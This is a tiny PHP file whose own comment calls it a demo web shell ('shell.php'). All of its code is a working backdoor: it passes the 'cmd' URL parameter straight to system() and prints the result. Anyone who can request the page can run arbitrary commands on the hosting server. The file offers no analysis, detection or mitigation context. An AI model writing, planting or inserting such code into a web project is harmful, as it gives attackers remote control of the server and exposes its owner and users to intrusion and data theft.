<?php
// shell.php — PHP Webshell (DEMO)
if (isset($_GET['cmd'])) {
    echo '<pre>';
    system($_GET['cmd']);
    echo '</pre>';
}
?>